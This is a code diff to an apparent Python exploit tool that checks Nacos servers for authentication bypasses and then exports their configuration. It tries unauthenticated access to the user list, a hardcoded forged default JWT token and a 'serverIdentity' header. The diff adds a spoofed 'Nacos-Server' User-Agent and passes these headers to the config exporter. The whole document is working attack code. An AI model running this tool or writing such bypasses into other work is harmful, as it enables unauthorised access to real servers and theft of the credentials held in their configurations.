@@ -40,13 +40,13 @@ class NacosAuthChecker:
         self.proxies = {"http": proxy, "https": proxy}
         self.token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTAwMDAwMDAwMDAwMDAwMDAwfQ.yL4GVAIpCGu0Y7Mpq7k4RfVML_nTHBbivofzfPs98XY"
         self.username = "nacos"
-        self.headers = ""
+        self.headers = {"User-Agent": "Nacos-Server"}
         self.timeout = timeout
 
     def check_unauthorized_access(self):
         url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate"
         try:
-            response = self.session.get(url, proxies=self.proxies, timeout=self.timeout)
+            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
                 return True
         except requests.exceptions.Timeout:
@@ -57,7 +57,7 @@ class NacosAuthChecker:
 
     def check_default_jwt_token(self):
         url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate&accessToken={self.token}"
-        self.headers = {"Authorization": self.token}
+        self.headers['Authorization'] = self.token
         try:
             response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
@@ -70,7 +70,7 @@ class NacosAuthChecker:
 
     def check_server_identity_bypass(self):
         url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&accessToken=&search=accurate"
-        self.headers = {"serverIdentity": "security"}
+        self.headers['serverIdentity']= "security"
         try:
             response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
@@ -159,7 +159,7 @@ def process_base_url(base_url, proxy, timeout):
             print(f"[+]{base_url} Found Vuln {auth_result}")
             # 导出配置
             if auth_result == "unauthorized_access":
-                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, "", auth_checker.username, "", timeout)
+                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, "", auth_checker.username, auth_checker.headers, timeout)
             elif auth_result == "default_jwt":
                 config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
             elif auth_result == "server_identity_bypass":
